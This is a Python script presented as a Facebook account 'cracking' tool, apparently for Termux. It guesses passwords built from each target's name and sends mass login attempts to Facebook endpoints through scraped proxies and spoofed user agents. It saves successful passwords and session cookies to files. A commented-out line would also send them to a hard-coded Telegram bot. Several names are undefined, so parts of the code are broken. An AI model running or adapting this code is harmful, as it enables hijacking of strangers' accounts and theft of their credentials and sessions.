# CODER <> WANGTEN 🍏

#──────────( IMPORT MODULES )──────────#
import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
print('\033[1;92m[✓] MODULES CHECKING....\n')
try:
    import requests 
except ImportError:
    print('\n  INSTALLING REQUESTS....\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  INSTALLING FUTURES....\n')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as anishgod
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
#──────────( PROXY SERVER )──────────#
try: 
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox) 
except Exception as e:
    print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[ANISH')
prox=open('.prox.txt','r').read().splitlines()

anish=(prox)
#──────────( PROXY SERVER )──────────#
try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('')
    time.sleep(2)
    os.system(f'xdg-open https://www.facebook.com/wangtenhere')
proxies=open('proxies.txt','r').read().splitlines()
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/wangten/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
#──────────( TRACKING USERS IP )──────────#
ip = requests.get("https://api.ipify.org").text
print('\033[1;92m[\033[1;92m✓\033[1;92m]\033[1;92m BOT SYSTEM IS TRACKING YOUR IP ADDRESS')
time.sleep(2)
print("\033[1;92m[\033[1;92m✓\033[1;92m]\033[1;92m THIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)

from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
    
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
#──────────( INDICATION )──────────#
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
#──────────( USER-AGENT-2/BOX )──────────#
def uaku2():
    try:
        ua=open('ua-web.txt','r').read().splitlines()
        for ub in ua : 
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/wangten/blob/main/ua-web.txt').text
        ua=open('.ua-web.txt','w')
        aa=re.findall('line''>(.*?)'<str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open(' ua-web.txt','r').read().splitlines()
#──────────( PROTECT-DATA-CAPTURE-&-BYPASS )──────────#
try:
    prox= requests.get('https://raw.githubusercontent.com/wangten/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('\x1b[1;92m[✓] PLEASE WAIT CHECKING UPDATE...')
    
proxies=open('proxies.txt','r').read().splitlines()

android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/wangten/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
#──────────( USER-AGENT'S )──────────#
def randomChoices(input_list, n):
    random_items = random.sample(input_list, n)
    result_string = ''.join(random_items) # You can change the delimiter as needed
    return result_string

def randBuildLSB():
    vchrome = str(random.randint(100,425))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/160.1.80.24.874;FBBV/4214829694;FBDM/{density=2.5,width=780,height=1920};FBLC/ca_MY;FBRV/4214899694;FBCR/1030;FBMF/Oppo;FBBD/Itel;FBPN/com.facebook.katana;FBDV/Ostin Realme 5;FBSV/7;FBOP/5;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(models)} Build/RP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randFBAN():
  VAPP = random.randint(400000000,499999999)
  ua="[FBAN/FB4A;FBAV/1727.3.0.74.284;FBBV/"+str(VAPP)+";FBDM/{density=2.1,width=780,height=1920};FBLC/ko_PT;FBRV/"+str(VAPP)+";FBCR/Docomo;FBMF/Itel LTD;FBBD/Docomo;FBPN/com.facebook.katana;FBDV/"+random.choice(models)+";FBSV/6;FBOP/5;FBCA/arm64-v8a:;]"
  return ua

def randBuildvsskj():
    END = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(models)} Build/RP2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

networks = ["Telenor", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange"]
def generate_FBAN():
  android_version=random.randint(5,15)
  device=random.choice(models)
  FBAV=f"{random.randint(180,500)}.0.0.{random.randint(1,999)}.{random.randint(1,999)}"
  FBBV=random.randint(100000000,999999999)
  FBCR=random.choice(networks)
  
  ua=f"[FBAN/FB4A;FBAV/{FBAV};FBBV/{FBBV};FBDM/"+"{density=2.5,width=1440,height=980}"+f";FBLC/fi_ID;FBRV/0;FBCR/{FBCR};FBMF/Vivo;FBBD/Kindle;FBPN/com.facebook.katana;FBDV/{device};FBSV/{android_version};FBOP/5;FBCA/x64:arm-v8a;]"
  return ua
  
def generate_device_dalvik():
  android_version=random.randint(3,14)
  device=random.choice(models)
  Build=f"RP1A.{randomChoices(string.digits,6)}.{randomChoices(string.digits,3)}"
  ua=f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {device} Build/{Build})"
  return ua
#──────────( COLOR'S )──────────#
sys.stdout.write('\x1b]2; ZEKROM\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
#──────────( LOGO )──────────#
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo ="""\x1b[38;5;46m'

██╗    ██╗ █████╗ ███╗   ██╗ ██████╗████████╗███████╗███╗   ██╗    
██║    ██║██╔══██╗████╗  ██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║    
██║ █╗ ██║███████║██╔██╗ ██║██║  ███╗  ██║   █████╗  ██╔██╗ ██║    
██║███╗██║██╔══██║██║╚██╗██║██║   ██║  ██║   ██╔══╝  ██║╚██╗██║    
╚███╔███╔╝██║  ██║██║ ╚████║╚██████╔╝  ██║   ███████╗██║ ╚████║    
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝    
                                                                   

\033[1;37m───────────────────────────────────
\033[1;37m CODER     ◈    \033[1;31mWANGTEN
\033[1;37m TOOL'S    ◈    \033[1;92mF-(CRACKED)
\033[1;37m───────────────────────────────────
\033[1;32mProGramming is The Poetry of Logic
\033[1;32m                 Just Do It.🎭
\033[1;32m"ProGramming is The Closest Thing"
\33[1;37m─────────────────────────────────── """
#──────────( CLEAR )──────────#
def clear():
    os.system("clear")
    print(logo)        
#──────────( RESULT'S )──────────#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print("───────────────────────────────────")
        print(' CRACKED COMPLETED...')
        print(' SUCCESSFULL : %s' % str(len(oks)))
        print(' CHECKPOINTS : %s' % str(len(cps)))
        print("───────────────────────────────────")
        input(" PRESS ENTER TO BACK MENU ")
        exit()
#──────────( MAIN-MENU )──────────#
def wangten():   
    os.system('clear')
    print(logo)
    print(f'[1] FILE CRACKING ')
    print(f'[F] JOIN FACEBOOK ')
    print('')
    select = input('SELECT MENU : ')
    if select =='1':
        method_crack()
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/wangtenhere')
    else:
        print('\n SELECT VALID OPTION... ')
        time.sleep(2)
        ANISH(allkey)
#──────────( METHOD'S )──────────#
def method_crack():
    global methods
    clear()
    print(f'\033[1;96m[1] \033[1;37mMETHOD (1) \033[1;92m[UPDATED/B-GRAPH]')
    print(f'\033[1;96m[2] \033[1;37mMETHOD (2) \033[1;92m[UPDATED/B-GRAPH]')
    print(f'\033[1;96m[3] \033[1;37mMETHOD (3) \033[1;92m[UPDATED/B-GRAPH]')
    print(f'\033[1;96m[4] \033[1;37mMETHOD (4) \033[1;92m[M-BASIC/TOUCH]')
    print(f'\033[1;96m[0] \033[1;37mBACK')
    print('')
    option = input('\033[1;37mSELECT METHOD : ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='4':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='0':
        anish()
    else:
      print('\n SELECT VALID OPTION...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('PUT FILE PATH :\033[1;92m ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('OPPS FILE NOT FOUND...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('TRY AGAIN...')
            time.sleep(2)
            main_crack().crack(id)
#──────────( METHOD-1 )──────────#
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ WANGTEN ] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'+'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'+'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'+'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9'+'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari'+'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile'+'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [WANGTEN-OK] {sid} | {ps} {S}")
                    #requests.get("https://api.telegram.org/bot6769693282:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6769693282&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    #print("\r\r\033[1;37m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/OKAY.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [WANGTEN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/CHECKPOINT.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#──────────( METHOD-3 )──────────#            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ WANGTEN ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 13; 7; Linux; Android 13;J3754T) AppleWebKit/537.36 (KHTML, like Gecko)100.0.6151.100 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [WANGTEN-OK] {sid} | {ps} {S}")
                    #requests.get("https://api.telegram.org/bot6769693282:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6769693282&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    #print("\r\r\033[1;96m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/OKAY.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [WANGTEN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CHECKPOINT.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
#──────────( METHOD-2 )──────────#            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ WANGTEN ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.2.1; de-de; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'+'Mozilla/5.0 (Linux; U; Android 2.1-update1; es-mx; SonyEricssonE10a Build/2.0.A.0.504) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17'+'Mozilla/5.0 (Linux; U; Android 1.6; ar-us; SonyEricssonX10i Build/R2BA026) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [WANGTEN-OK] {sid} | {ps} {S}")
                          #print("\r\r\033[1;37m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/OKAY.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [WANGTEN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CHECKPOINT.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)
#──────────( METHOD-4 )──────────#
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ ANISH ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(sagent)
                ua=random.choice(ugen)
                nip=random.choice(riddu)
                proxs= {'http': 'socks4://'+nip}
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                head = {'Host': 'mbasic.facebook.com', 'method': 'POST', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=1', 'cache-control': 'no-cache, no-store, must-revalidate', 'referer': 'https://mbasic.facebook.com/', 'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': 'Windows', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'pragma': 'no-cache', 'priority': 'u=1', 'cross-origin-resource-policy': 'cross-origin', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; 12; Redmi Note 10 ProW494P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4612.118 Chrome/107.0.0.0 Mobile Safari/537.36'}
                head2 = {'Host': 'touch.facebook.com', 'method': 'POST', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=1', 'cache-control': 'no-cache, no-store, must-revalidate', 'referer': 'https://mbasic.facebook.com/', 'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': 'Windows', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'pragma': 'no-cache', 'priority': 'u=1', 'cross-origin-resource-policy': 'cross-origin', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.2; LG-H522 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.86 Mobile Safari/537.36[FBAN/EMA;FBLC/en-US;FBAV/330.0.0.10.108;]'}
                sex = ( head, head2 )
                headers=random.choice(sex)
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=headers,proxies=proxs)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [ANISH-OK] {sid} | {ps} {S}")
                           #print("\r\r\033[1;96m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/OKAY.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [WANGTEN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CHECKPOINT.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print('PUT LIMIT BETWEEN 1 TO 30')
            sl = int(input('HOW MANY PASSWORD DO YOU WANT TO ADD ? : '))
            os.system("clear")
            print(logo)
            print(f'{S} (Example : first123,last1122,firstlast,last,etc)')
            print('')
            if sl =='':
                print('\n PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print('\nPASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f' PASSWORD ({sr+1}) : '))
            os.system("clear")
            print(logo)
            
            print(f"\r\033[3;96mUSED FLIGHT MODE FOR BETTER RESULT'S {S}\033[0;1m")
            print("───────────────────────────────────")
            print(f'{S} TOTAL IDs ◈ \033[1;32m%s ' % len(self.id))
            print(f'{S} ◈ CRACKING STARTED ◈')
            print("───────────────────────────────────")
            with wangten(max_workers=30) as w:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                anishworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                anishworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                anishworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                anishworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)

wang10()

#>>>>> WRITTEN BY <<<<<<<#
